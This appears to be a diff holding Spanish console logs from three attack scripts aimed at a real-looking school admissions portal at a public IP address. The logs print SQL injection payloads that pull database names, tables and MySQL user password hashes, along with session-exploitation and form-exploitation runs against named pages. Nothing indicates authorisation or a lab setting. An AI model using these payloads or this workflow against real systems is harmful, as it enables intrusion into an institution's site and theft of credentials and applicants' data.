@@ -1,0 +1,91 @@
+Script Corregido de Extracción MySQL (con import re faltante)
+
+=== EXTRACCIÓN MYSQL CORREGIDA ===
+[*] Extrayendo información de MySQL...
+
+[*] Payload 1: admin' UNION SELECT database(),version(),user()--...
+[!] Datos encontrados (1):
+    - Solicita Ficha de Admisión
+[+] Respuesta guardada en mysql_info_1.html
+
+[*] Payload 2: admin' UNION SELECT schema_name,2,3 FROM information_schema.schemata--...
+[!] Datos encontrados (2):
+    *** admin' UNION SELECT schema_name,2,3 FROM information_schema.schemata--
+    - Solicita Ficha de Admisión
+[+] Respuesta guardada en mysql_info_2.html
+
+[*] Payload 3: admin' UNION SELECT table_name,table_schema,3 FROM information_schema.tables WHE...
+[!] Datos encontrados (1):
+    - Solicita Ficha de Admisión
+[+] Respuesta guardada en mysql_info_3.html
+
+[*] Payload 4: admin' UNION SELECT user,host,authentication_string FROM mysql.user--...
+[!] Datos encontrados (2):
+    *** admin' UNION SELECT user,host,authentication_string FROM mysql.user--
+    - Solicita Ficha de Admisión
+[+] Respuesta guardada en mysql_info_4.html
+
+[*] Extrayendo datos de la tabla: users
+[-] No se encontraron columnas para la tabla users
+
+[*] Extrayendo datos de la tabla: usuarios
+[-] No se encontraron columnas para la tabla usuarios
+
+[*] Extrayendo datos de la tabla: admin
+[-] No se encontraron columnas para la tabla admin
+
+[*] Extrayendo datos de la tabla: administradores
+[-] No se encontraron columnas para la tabla administradores
+
+[*] Extrayendo datos de la tabla: login
+[-] No se encontraron columnas para la tabla login
+
+[*] Extrayendo datos de la tabla: user
+[-] No se encontraron columnas para la tabla user
+
+[*] Extrayendo datos de la tabla: usuario
+[-] No se encontraron columnas para la tabla usuario
+
+Script de Explotación de Sesión Activa
+
+=== EXPLOTACIÓN DE SESIÓN ACTIVA ===
+[*] Explorando área autenticada...
+
+[+] Página: /jsp/index.jsp
+    Status: 200
+    Tamaño: 1750 bytes
+    [+] Página guardada en auth__jsp_index.jsp.html
+
+[+] Página: /jsp/cerrar_sesion.jsp
+    Status: 200
+    Tamaño: 1808 bytes
+    [+] Página guardada en auth__jsp_cerrar_sesion.jsp.html
+
+[*] Fuerza bruta de directorios autenticados...
+
+[*] Probando acciones privilegiadas...
+
+Script de Explotación de Formularios Corregido
+
+=== EXPLOTACIÓN DE FORMULARIOS CORREGIDA ===
+[*] Explotando formularios (versión corregida)...
+
+[*] Analizando: /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=N
+    [+] Enviando a: https://189.254.143.102/jsp/escolar/proceso_admision/proceso_interesado.jsp
+    Status: 200
+    [+] Respuesta guardada en form_response__jsp_escolar_proceso_admision_proceso_interesado.jspxModalidadPN.html
+
+[*] Analizando: /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=D
+    [+] Enviando a: https://189.254.143.102/jsp/escolar/proceso_admision/proceso_interesado.jsp
+    Status: 200
+    [+] Respuesta guardada en form_response__jsp_escolar_proceso_admision_proceso_interesado.jspxModalidadPD.html
+
+[*] Analizando: /jsp/escolar/proceso_admision/proceso_interesado.jsp?xModalidadP=Z
+    [+] Enviando a: https://189.254.143.102/jsp/escolar/proceso_admision/proceso_interesado.jsp
+    Status: 200
+    [+] Respuesta guardada en form_response__jsp_escolar_proceso_admision_proceso_interesado.jspxModalidadPZ.html
+
+[*] Analizando: /jsp/escolar/proceso_admision_lic/proceso_interesado.jsp
+    [+] Enviando a: https://189.254.143.102/jsp/escolar/proceso_admision_lic/proceso_interesado.jsp
+    Status: 200
+    [+] Respuesta guardada en form_response__jsp_escolar_proceso_admision_lic_proceso_interesado.jsp.html
